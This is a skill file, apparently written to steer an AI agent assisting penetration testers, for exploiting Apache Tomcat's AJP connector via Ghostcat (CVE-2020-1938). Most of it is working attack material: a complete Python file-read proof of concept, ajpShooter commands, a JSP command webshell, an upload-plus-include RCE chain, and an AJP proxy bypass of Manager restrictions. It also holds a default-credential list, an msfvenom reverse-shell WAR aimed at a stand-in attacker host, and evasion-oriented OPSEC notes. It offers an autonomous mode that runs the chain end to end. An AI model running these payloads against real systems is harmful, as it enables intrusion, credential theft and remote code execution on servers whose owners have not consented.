---
name: ajp-ghostcat
description: >
  Exploit Apache JServ Protocol (AJP) misconfigurations and Ghostcat
  (CVE-2020-1938) for file read and remote code execution on Apache Tomcat.
  Use when port 8009 is open or AJP connector is exposed.
keywords:
  - AJP
  - Apache JServ Protocol
  - Ghostcat
  - CVE-2020-1938
  - Apache Tomcat
  - port 8009
  - AJP connector
  - AJP proxy
  - Tomcat Manager
  - WAR deploy
  - WEB-INF/web.xml
  - ajpShooter
  - mod_proxy_ajp
  - nginx ajp
  - tomcat file read
  - AJP file inclusion
tools:
  - nmap
  - ajpShooter
  - AJPy
  - nginx
  - curl
opsec: medium
---

# AJP / Ghostcat (CVE-2020-1938)

You are helping a penetration tester exploit Apache JServ Protocol (AJP)
misconfigurations and Ghostcat (CVE-2020-1938). AJP is a binary protocol used
for communication between a front-end web server and Tomcat. When the AJP
connector is exposed (typically port 8009), it enables arbitrary file read from
the webapp directory and, with a file upload primitive, remote code execution.
All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate AJP
  and read web.xml"). Local-only operations (file writes, output parsing,
  engagement logging, hash cracking) do not require approval. At decision forks,
  present options and let the user choose.
- **Autonomous**: Execute end-to-end. Enumerate AJP, read config files, attempt
  RCE via JSP inclusion or AJP proxy bypass to Manager. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (AJP confirmed,
  file read successful, credentials extracted, RCE achieved, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] ajp-ghostcat → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `ghostcat-web-xml.txt`, `ajp-manager-access.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[ajp-ghostcat] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] ajp-ghostcat → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.

## Skill Routing Is Mandatory

When this skill says "Route to **skill-name**" or "→ **skill-name**", you MUST:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

Do NOT execute the technique inline — even if the attack is trivial or you
already know the answer. Skills contain operator-specific methodology,
client-scoped payloads, and edge-case handling that general knowledge does not.

If you need a skill but don't know the exact name, use
`search_skills("description")` to find it. Before loading a search result,
verify the returned description matches your scenario — embedding similarity
does not guarantee relevance. After loading, check the skill's Prerequisites
and Step 1 against current engagement state before following it.

This applies in both guided and autonomous modes. Autonomous mode means you
make routing decisions without asking — it does not mean you skip skills.

**Scope boundary:** This skill covers AJP protocol exploitation — Ghostcat file
read, AJP attribute injection for JSP inclusion, and AJP proxy bypass to access
restricted Tomcat management interfaces. If your findings lead outside this
scope (e.g., credentials for SSH, database access, post-exploitation), STOP —
update state.md and route to the appropriate skill. Do not continue past your
scope boundary.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Prerequisites

- AJP port open (typically 8009) with network access from the attackbox
- Apache Tomcat running behind the AJP connector
- For Ghostcat file read: Tomcat < 9.0.31, < 8.5.51, or < 7.0.100
- For JSP inclusion RCE: a file upload primitive somewhere in the application
- For AJP proxy attack: AJP port accessible + Tomcat Manager deployed
- Tools: `nmap`, `ajpShooter.py` (`pip install ajpShooter`), or Python 3
  (for inline PoC)

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **AJP port** — is port 8009 (or non-standard AJP port) open?
2. **Tomcat version** — can we fingerprint from HTTP headers, error pages, or
   nmap scripts?
3. **Webapp context paths** — ROOT, manager, host-manager, custom apps?
4. **HTTP access** — is port 8080/8443 also exposed? What does Tomcat Manager
   show?
5. **AJP secret** — is `requiredSecret` configured? (blocks unauthenticated AJP)

```bash
# Scan for AJP port and Tomcat HTTP
nmap -sV -p 8009,8080,8443 TARGET

# Detailed AJP enumeration with NSE scripts
nmap -sV -p 8009 --script ajp-auth,ajp-headers,ajp-methods,ajp-request TARGET
```

If nmap shows AJP port as open and responding, proceed. If filtered or closed,
this skill does not apply — check if a firewall is in the way or if AJP is
bound to localhost only.

Skip if context was already provided.

## Step 2: Enumerate AJP Service

Confirm AJP is responding and gather information:

```bash
# Confirm AJP responds (ajp-request sends a GET via AJP and shows the response)
nmap -sV -p 8009 --script ajp-request TARGET

# Check supported methods
nmap -p 8009 --script ajp-methods TARGET

# Check authentication requirements
nmap -p 8009 --script ajp-auth TARGET
```

If AJP responds with a page, note the Tomcat version from response headers or
page content. If AJP returns a connection reset or authentication error,
`requiredSecret` may be configured — see Troubleshooting.

## Step 3: Ghostcat File Read (CVE-2020-1938)

Ghostcat exploits the AJP connector's ability to set internal request attributes
(`javax.servlet.include.request_uri`, `javax.servlet.include.path_info`,
`javax.servlet.include.servlet_path`). This lets an attacker read any file
within any webapp's directory as if it were a JSP — but the file is returned
raw (not executed) when it lacks valid JSP syntax.

**Vulnerable versions:** Tomcat < 9.0.31, < 8.5.51, < 7.0.100

### Variant A: ajpShooter.py

```bash
# Install ajpShooter
pip install ajpShooter

# Read /WEB-INF/web.xml from ROOT context
ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read

# Read from a specific webapp context
ajpShooter.py http://TARGET 8009 /manager/WEB-INF/web.xml read
ajpShooter.py http://TARGET 8009 /host-manager/WEB-INF/web.xml read
```

### Variant B: Inline Python AJP PoC

Use this when ajpShooter is unavailable. This compact script implements the AJP
1.3 protocol directly — no dependencies beyond Python 3 stdlib.

```python
#!/usr/bin/env python3
"""Ghostcat (CVE-2020-1938) file read PoC — AJP 1.3 protocol."""
import socket, struct, sys

def pack_string(s):
    """Pack a string into AJP format: 2-byte length + data + null."""
    if s is None:
        return struct.pack(">h", -1)
    s = s.encode() if isinstance(s, str) else s
    return struct.pack(">H", len(s)) + s + b"\x00"

def ajp_forward_request(target, port, file_path, context="/"):
    """Send an AJP FORWARD_REQUEST to read a file via attribute injection."""
    # AJP request attributes that trigger file inclusion
    attributes = b""
    # javax.servlet.include.request_uri (attribute code 0x0E = 14)
    attributes += b"\x0E" + pack_string(context)
    # javax.servlet.include.servlet_path (attribute code 0x0F = 15)
    attributes += b"\x0F" + pack_string(file_path)
    # Terminator
    attributes += b"\xFF"

    # Build AJP FORWARD_REQUEST (type 2) for GET method
    body = b"\x02"              # prefix_code: FORWARD_REQUEST
    body += b"\x02"             # method: GET
    body += pack_string("HTTP/1.1")   # protocol
    body += pack_string(context)      # req_uri
    body += pack_string(target)       # remote_addr
    body += pack_string(target)       # remote_host
    body += pack_string(target)       # server_name
    body += struct.pack(">H", port)   # server_port
    body += b"\x00"             # is_ssl: false
    # Headers: Host only (count = 1)
    body += struct.pack(">H", 1)
    body += b"\xA0\x0B"        # Host header code
    body += pack_string(target)
    # Attributes
    body += attributes

    # Wrap in AJP packet: magic (0x1234) + length + body
    packet = b"\x12\x34" + struct.pack(">H", len(body)) + body

    # Send and receive
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((target, port))
    sock.send(packet)

    # Read response
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    sock.close()

    # Extract response body — skip AJP response headers
    # Look for the SEND_BODY_CHUNK marker (type 3)
    result = b""
    offset = 0
    while offset < len(data):
        if offset + 4 > len(data):
            break
        magic = struct.unpack(">H", data[offset:offset+2])[0]
        length = struct.unpack(">H", data[offset+2:offset+4])[0]
        if offset + 4 + length > len(data):
            chunk_data = data[offset+4:]
        else:
            chunk_data = data[offset+4:offset+4+length]
        # SEND_BODY_CHUNK: prefix_code = 0x03
        if len(chunk_data) > 0 and chunk_data[0] == 0x03:
            if len(chunk_data) > 3:
                body_len = struct.unpack(">H", chunk_data[1:3])[0]
                result += chunk_data[3:3+body_len]
        offset += 4 + length
    return result.decode(errors="replace")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <port> [file] [context]")
        print(f"Example: {sys.argv[0]} 10.10.10.5 8009 /WEB-INF/web.xml /")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    fpath = sys.argv[3] if len(sys.argv) > 3 else "/WEB-INF/web.xml"
    ctx = sys.argv[4] if len(sys.argv) > 4 else "/"
    print(ajp_forward_request(host, port, fpath, ctx))
```

### Target Files to Read

Read these files across all webapp contexts (ROOT `/`, `/manager`,
`/host-manager`, any custom apps discovered):

| File | Contains |
|---|---|
| `/WEB-INF/web.xml` | Servlet mappings, security constraints, init params |
| `/WEB-INF/classes/application.properties` | Spring Boot config, DB creds, API keys |
| `/WEB-INF/classes/db.properties` | Database connection strings |
| `/META-INF/context.xml` | JNDI datasources with DB credentials |
| `/WEB-INF/web.properties` | Application configuration |
| `/WEB-INF/spring-*.xml` | Spring framework config with bean definitions |

```bash
# Read from ROOT context
ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read
ajpShooter.py http://TARGET 8009 /WEB-INF/classes/application.properties read
ajpShooter.py http://TARGET 8009 /META-INF/context.xml read

# Read from manager context
ajpShooter.py http://TARGET 8009 /manager/WEB-INF/web.xml read

# Read from host-manager context
ajpShooter.py http://TARGET 8009 /host-manager/WEB-INF/web.xml read
```

Save all file contents to `engagement/evidence/` for analysis.

## Step 4: Ghostcat JSP Inclusion (RCE)

When you have a **file upload primitive** anywhere in the application (or can
write to a path accessible by Tomcat), you can achieve RCE by combining file
upload with AJP attribute injection to force Tomcat to process an uploaded file
as JSP.

**Requirements:**
- A file upload endpoint that stores files at a known or predictable path
- OR a writable path within the Tomcat docroot
- AJP port accessible (Ghostcat-vulnerable version)

### How It Works

1. Upload a file containing JSP code (can have any extension — `.txt`, `.png`,
   `.xml` — Tomcat processes it as JSP because of the AJP attribute injection)
2. Use AJP to include the uploaded file with `javax.servlet.include.servlet_path`
   pointing to the uploaded file's path
3. Tomcat compiles and executes the file as JSP

### JSP Webshell Payload

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

### Exploitation

```bash
# Upload the JSP payload via the file upload endpoint (adapt to the target)
# Example: if upload stores to /uploads/shell.txt
curl -F "file=@shell.jsp;filename=shell.txt" http://TARGET:8080/upload

# Include the uploaded file as JSP via AJP attribute injection
ajpShooter.py http://TARGET 8009 /uploads/shell.txt eval

# Execute commands via the included JSP
# The eval mode sends the request with the include attributes set
# and the file is processed as JSP by Tomcat
```

If the uploaded file's path is unknown, check the upload response for a file
path or URL, or try common paths: `/uploads/`, `/tmp/`, `/attachments/`,
`/static/uploads/`.

## Step 5: AJP Proxy Attack — Bypass Tomcat Manager Restrictions

Tomcat Manager is often restricted to localhost connections via the
`RemoteAddrValve` in `META-INF/context.xml`:

```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />
```

When AJP is exposed, you can proxy through it — the connection to Tomcat
arrives from your proxy on localhost (or the proxy host), bypassing the IP
restriction.

### Variant A: Apache with mod_proxy_ajp

```bash
# Install Apache (if not present)
sudo apt install apache2 libapache2-mod-proxy-html

# Enable required modules
sudo a2enmod proxy proxy_ajp

# Create proxy config
cat > /tmp/ajp-proxy.conf << 'EOF'
<VirtualHost *:8888>
    ProxyPass / ajp://TARGET:8009/
    ProxyPassReverse / ajp://TARGET:8009/
</VirtualHost>
EOF

sudo cp /tmp/ajp-proxy.conf /etc/apache2/sites-available/ajp-proxy.conf
sudo a2ensite ajp-proxy
sudo apachectl restart

# Access Tomcat Manager through the proxy
curl http://127.0.0.1:8888/manager/html
```

### Variant B: nginx with ngx_http_upstream_jk_module

nginx requires compilation with AJP support or use of a third-party module.
Apache with mod_proxy_ajp is simpler and preferred.

```nginx
# nginx.conf (requires AJP module compiled in)
upstream tomcat_ajp {
    server TARGET:8009;
}

server {
    listen 8888;
    location / {
        ajp_pass tomcat_ajp;
    }
}
```

### Variant C: Python AJP proxy (no root required)

Use AJPy for a lightweight AJP proxy that requires no web server installation:

```bash
# Install AJPy
pip install ajpy

# Proxy requests to Tomcat Manager via AJP
python -m ajpy.ajp_forward TARGET 8009 /manager/html --method GET
```

### Access Tomcat Manager

Once proxied, try default credentials:

| Username | Password |
|---|---|
| `tomcat` | `tomcat` |
| `tomcat` | `s3cret` |
| `admin` | `admin` |
| `admin` | `tomcat` |
| `manager` | `manager` |
| `role1` | `tomcat` |
| `both` | `tomcat` |
| `root` | `root` |

Also check credentials extracted from `web.xml` or `tomcat-users.xml` via
Ghostcat file read (Step 3).

### WAR Deploy for RCE

Once authenticated to Tomcat Manager:

```bash
# Generate a WAR webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKBOX LPORT=4444 -f war -o shell.war

# Deploy via Manager
curl -u 'tomcat:s3cret' --upload-file shell.war \
  "http://127.0.0.1:8888/manager/text/deploy?path=/shell&update=true"

# Trigger the shell
curl http://127.0.0.1:8888/shell/

# Or use a simpler JSP webshell in a WAR:
mkdir -p /tmp/warshell && cat > /tmp/warshell/cmd.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = br.readLine()) != null) out.println(l);
}
%>
JSPEOF
cd /tmp/warshell && jar -cvf ../cmd.war cmd.jsp

# Deploy the WAR
curl -u 'tomcat:s3cret' --upload-file /tmp/cmd.war \
  "http://127.0.0.1:8888/manager/text/deploy?path=/cmd&update=true"

# Execute commands
curl "http://127.0.0.1:8888/cmd/cmd.jsp?cmd=id"
```

## Step 6: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After completing this technique:

- **Got credentials from web.xml / application.properties**: Test against SSH,
  databases, other services. STOP. Route to the relevant skill (e.g.,
  `search_skills("SSH brute force")` or `search_skills("MySQL exploitation")`).
  Pass: extracted credentials, target services.
- **Got RCE via JSP inclusion or WAR deploy**: Stabilize the shell, then STOP.
  Route to **linux-discovery** or **windows-discovery** — call
  `get_skill("linux-discovery")` or `get_skill("windows-discovery")`. Pass:
  shell type, access level, target OS. Do not perform post-exploitation inline.
- **Found database credentials in config files**: Route to the appropriate
  database exploitation skill. Pass: DBMS type, connection string, credentials.
- **Found internal services via config files** (e.g., internal URLs, API
  endpoints): Route to **web-discovery** — call `get_skill("web-discovery")`.
  Pass: discovered URLs and services.
- **AJP blocked by requiredSecret**: Note in Blocked section. If HTTP is also
  available, route to **web-discovery** for HTTP-based testing.

When routing, always pass along: target, AJP port, Tomcat version, files read,
credentials found, current mode, and what worked.

## OPSEC Notes

- **AJP requests** appear in Tomcat's `localhost_access_log` — each file read
  generates a log entry
- **WAR deployment** is very noisy — creates files on disk, logged by Manager,
  visible to any admin checking deployed applications
- **AJP proxy setup** is entirely local to the attackbox — no target-side
  artifacts beyond normal AJP log entries
- **Ghostcat file read** is relatively quiet — looks like a normal AJP request
  in logs, but reading `/WEB-INF/` paths may trigger security monitoring if
  Tomcat access logs are analyzed
- **Nmap script scans** on port 8009 generate AJP protocol traffic that IDS
  may flag

## Troubleshooting

### AJP Port Filtered / Connection Refused
- AJP may be bound to localhost only (common in production) — check if you have
  access from an internal host or via SSRF
- A firewall may block port 8009 — check if non-standard ports are in use
- Use `nmap -sV -p 1-65535 TARGET` for a full port scan

### requiredSecret Configured
- Tomcat 9.0.31+, 8.5.51+, and 7.0.100+ require `secret` attribute by default
- If you can read `server.xml` via another vuln, look for the secret value:
  `<Connector port="8009" protocol="AJP/1.3" secretRequired="true" secret="..."/>`
- ajpShooter supports the `--ajp_secret` flag if you have the secret
- If secret is set and unknown, this attack path is blocked — note in state.md

### Ghostcat Returns Empty Response
- The target file may not exist — try different context paths (`/`, `/ROOT/`,
  application-specific paths)
- The webapp may be empty — try `/manager/WEB-INF/web.xml` or
  `/host-manager/WEB-INF/web.xml`
- Tomcat may be patched — verify version from HTTP headers or error pages

### Tomcat Manager Not Available
- Manager webapp may not be deployed — check for 404 vs 403
- 403 means deployed but IP-restricted — use AJP proxy bypass (Step 5)
- 404 means not deployed — focus on Ghostcat file read and other attack paths

### AJP Proxy Returns 502 / 503
- Verify AJP port is correct and Tomcat is running
- Check `ProxyPass` target matches exactly: `ajp://TARGET:8009/`
- Ensure the AJP connector is enabled in Tomcat's `server.xml`
- Try `curl -v` to see detailed error from the proxy

### No File Upload for JSP Inclusion RCE
- Look for file upload endpoints in the webapp (check web.xml for servlet
  mappings, look for multipart form handlers)
- Check if Tomcat's `DefaultServlet` has `readonly=false` (allows PUT)
- If no upload primitive exists, focus on credential extraction from config
  files and lateral movement
